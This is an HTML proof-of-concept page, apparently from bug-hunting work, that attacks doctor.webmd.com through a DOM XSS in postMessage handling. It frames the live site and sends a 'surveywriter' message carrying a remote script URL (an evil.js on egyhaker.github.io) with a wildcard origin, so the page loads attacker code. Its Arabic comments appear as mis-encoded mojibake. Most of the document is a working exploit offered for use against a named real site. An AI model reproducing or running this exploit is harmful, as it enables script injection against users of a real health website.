<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - WebMD Vulnerability Analysis</title>
    <style>
        body { font-family: sans-serif; background: #f0f0f0; text-align: center; padding: 20px; }
        #status { font-weight: bold; color: #d9534f; margin-bottom: 10px; }
        iframe { border: 5px solid #333; box-shadow: 0 0 20px rgba(0,0,0,0.2); width: 90%; height: 500px; }
    </style>
</head>
<body>
    <h1>Security Research: DOM XSS via PostMessage</h1>
    <div id="status">Status: Waiting for Victim Site to load...</div>
    
    <iframe id="victim" src="https://doctor.webmd.com/results?q=test"></iframe>

    <script>
        const frame = document.getElementById('victim');
        const statusDiv = document.getElementById('status');

        // Ù†Ù†ØªØ¸Ø± Ø­ØªÙ‰ ÙŠØªÙ… ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù€ iframe Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
        frame.onload = function() {
            statusDiv.innerText = "Target loaded. Preparing Payload...";
            statusDiv.style.color = "#f0ad4e";

            // Ù†Ù†ØªØ¸Ø± 4 Ø«ÙˆØ§Ù†Ù Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ø¶Ù…Ø§Ù† ØªØ­Ù…ÙŠÙ„ Ø³ÙƒØ±ÙŠØ¨ØªØ§Øª chunk-vendors.js
            setTimeout(() => {
                const payload = {
                    message: "surveywriter",
                    source: "https://egyhaker.github.io/webmd.com-attacker/evil.js" // Ù…Ù„ÙÙƒ Ø§Ù„Ø®Ø¨ÙŠØ«
                };

                statusDiv.innerText = "ğŸš€ Payload Sent! If vulnerable, an alert will pop up.";
                statusDiv.style.color = "#5cb85c";

                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ù†Ø§ÙØ°Ø© WebMD
                // Ù†Ø³ØªØ®Ø¯Ù… "*" Ù„ØªØ®Ø·ÙŠ ÙØ­Øµ Ø§Ù„Ù€ Origin Ù„Ø£Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…ØµØ§Ø¨ Ù„Ø§ ÙŠÙØ­ØµÙ‡ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­
                frame.contentWindow.postMessage(payload, "*");
                
            }, 4000);
        };
    </script>
</body>
</html>
